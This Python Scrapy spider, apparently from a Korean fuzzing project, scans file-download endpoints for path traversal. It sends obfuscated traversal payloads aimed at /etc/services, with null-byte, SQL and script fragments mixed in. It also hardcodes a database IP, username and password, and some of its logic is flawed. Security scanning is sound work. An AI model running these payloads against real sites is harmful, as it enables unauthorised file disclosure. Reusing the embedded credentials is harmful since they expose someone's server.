import scrapy
from scrapy.crawler import CrawlerProcess
import mysql.connector
import json


class FileDownloadVulnerabilitySpider(scrapy.Spider):
    name = "file_download_vulnerability"

    def __init__(self, *args, **kwargs):
        super(FileDownloadVulnerabilitySpider, self).__init__(*args, **kwargs)
        self.connection = self.create_db_connection()
        self.start_urls = self.get_url()
        self.proxies = self.get_proxies_from_db(self.start_urls)
        # 결과를 저장할 리스트
        self.results = []

    def create_db_connection(self):
        # 데이터베이스 연결 생성
        try:
            connection = mysql.connector.connect(
                host="13.209.63.65",
                database="Fuzzingzzingi",
                user="zzingzzingi",
                password="!Ru7eP@ssw0rD!12"
            )

            return connection
        except Exception as e:
            self.log(f"SQL connect error: {e}")
            return None

    def get_url(self):
        # DB에서 URL 가져오기
        url_list = []
        try:
            if self.connection.is_connected():
                cursor = self.connection.cursor()
                cursor.execute('SELECT url FROM requests;')
                result = cursor.fetchall()
                for url in result:
                    url_list.append(url[0])
        except Exception as e:
            self.log(f"SQL connect error: {e}")

        return url_list

    def get_proxies_from_db(self, url_list):
        proxy_list = []
        try:
            if self.connection.is_connected():
                cursor = self.connection.cursor()
                for url in url_list:
                    cursor.execute('SELECT parameters FROM requests WHERE url=%s', (url,))
                    proxies = cursor.fetchall()

                    for proxy in proxies:
                        parameters = json.loads(proxy[0])
                        if 'proxy' in parameters:
                            proxy_list.append(parameters['proxy'])

        except Exception as e:
            print(f"DB ERROR: {e}")

        return proxy_list

    # def get_proxies_from_db(self):
    #     # DB에서 프록시 파라미터 가져오기
    #     proxy_list = []
    #     try:
    #         if self.connection.is_connected():
    #             cursor = self.connection.cursor()
    #             cursor.execute('SELECT proxy_params FROM proxies')
    #             proxies = cursor.fetchall()
    #             for proxy in proxies:
    #                 proxy_list.append(proxy[0])
    #
    #     except Exception as e:
    #         self.log(f"SQL connect error: {e}")
    #
    #     return proxy_list

    def start_requests(self):
        # 파일 다운로드 테스트 시작
        for url in self.start_urls:
            for proxy in self.proxies:
                yield scrapy.Request(url=url, callback=self.parse, meta={'proxy': proxy})

    def parse(self, response):
        # 프록시 파라미터 기반으로 파일 다운로드 테스트 진행
        # 1번 조건: 응답 헤더에 Content-Disposition이 있고 URL에 파라미터가 있는 경우에만 퍼징 수행
        if 'Content-Disposition' in response.headers and '?' in response.url:
            proxy_params = response.meta['proxy']
            params = proxy_params.split('&')

            # 2번 조건: 파라미터별로 '/'와 '/./'를 넣어보고 동일한 파일이 받아지는지 확인
            for param in params:
                if 'filepath=' in param or 'filename=' in param:
                    base_url = f"{response.url}?{proxy_params}"
                    yield scrapy.Request(url=base_url, callback=self.test_file_download)

                    # 기본 경로 조작 테스트
                    paths = ['/', '/./']
                    for path in paths:
                        # 모든 파라미터에 대해 경로 조작을 시도
                        new_params = '&'.join([f"{path}{p}" for p in params])
                        test_url = f"{response.url}?{new_params}"
                        yield scrapy.Request(url=test_url, callback=self.test_file_download)

                    # 3번 조건: /../를 넣어보고 파일이 받아지지 않는지 확인
                    new_params = '&'.join([f"/../{p}" for p in params])
                    test_url = f"{response.url}?{new_params}"
                    yield scrapy.Request(url=test_url, callback=self.check_traversal)

                    # 수정된 4번 조건: 난독화된 경로 및 추가된 경로 테스트
                    obfuscate_strs = ["", "../", "%00", "UNION", "'", '"', ";", "<script>"]
                    for obfuscate_str in obfuscate_strs:
                        obfuscated_path = f'////////.{obfuscate_str}.//////.////' * 10 + "/etc/////.////services"
                        new_params = '&'.join([f"{p}{obfuscated_path}" if p == param else p for p in params])
                        test_url = f"{response.url}?{new_params}"
                        yield scrapy.Request(url=test_url, callback=self.test_file_download)

    def check_traversal(self, response):
        # 경로 조작을 통한 파일 다운로드 확인
        if 'Content-Disposition' in response.headers:
            content_disposition = response.headers['Content-Disposition'].decode()
            if 'attachment' in content_disposition:
                self.log(f'경로 조작을 통해 파일이 성공적으로 다운로드되었습니다: {response.url}')
                self.results.append({
                    'url': response.url,
                    'status': 'success',
                    'message': '경로 조작을 통해 파일이 성공적으로 다운로드되었습니다'
                })
            else:
                self.log(f'Content-Disposition 헤더가 있지만 첨부 파일이 아닙니다: {response.url}')
                self.results.append({
                    'url': response.url,
                    'status': 'failed',
                    'message': 'Content-Disposition 헤더가 있지만 첨부 파일이 아닙니다'
                })
        else:
            self.log(f'Content-Disposition 헤더가 없습니다: {response.url}')
            self.results.append({
                'url': response.url,
                'status': 'failed',
                'message': 'Content-Disposition 헤더가 없습니다'
            })

    def insert_payload_to_db(self, file_url):
        # 파일 URL에 공격 페이로드 삽입
        try:
            if self.connection.is_connected():
                cursor = self.connection.cursor()
                payload = f"{file_url}?attack_vector=malicious_file"
                cursor.execute("INSERT INTO payloads (payload) VALUES (%s)", (payload,))
                self.connection.commit()
        except Exception as e:
            self.log(f"SQL insert error: {e}")

    def test_file_download(self, response):
        # 파일 다운로드 테스트
        if 'Content-Disposition' in response.headers:
            content_disposition = response.headers['Content-Disposition'].decode()
            if 'attachment' in content_disposition:
                file_name = response.url.split('/')[-1]
                with open(file_name, 'wb') as file:
                    file.write(response.body)
                self.log(f'파일이 성공적으로 다운로드되었습니다: {response.url}')
                self.results.append({
                    'url': response.url,
                    'status': 'success',
                    'message': '파일이 성공적으로 다운로드되었습니다'
                })
            else:
                self.log(f'Content-Disposition 헤더가 있지만 첨부 파일이 아닙니다: {response.url}')
                self.results.append({
                    'url': response.url,
                    'status': 'failed',
                    'message': 'Content-Disposition 헤더가 있지만 첨부 파일이 아닙니다'
                })
        else:
            self.log(f'Content-Disposition 헤더가 없습니다: {response.url}')
            self.results.append({
                'url': response.url,
                'status': 'failed',
                'message': 'Content-Disposition 헤더가 없습니다'
            })

        # 의심되는 취약점 로깅
        if any(keyword in response.url for keyword in ['../', '%00', '%27', '%22', '<script>', 'UNION SELECT']):
            self.log(f'파일 다운로드 취약점이 감지되었습니다: {response.url}')
            self.results.append({
                'url': response.url,
                'status': 'potential vulnerability',
                'message': '파일 다운로드 취약점이 감지되었습니다'
            })
        else:
            self.log(f'파일 다운로드에 실패했습니다: {response.url}')
            self.results.append({
                'url': response.url,
                'status': 'failed',
                'message': '파일 다운로드에 실패했습니다'
            })

    def closed(self, reason):
        # 결과를 JSON 파일로 저장
        with open('results.json', 'w', encoding='utf-8') as f:
            json.dump(self.results, f, ensure_ascii=False, indent=4)
        self.log(f'파일 다운로드 취약점 탐지 결과가 vulnerability_results.json 파일에 저장되었습니다')

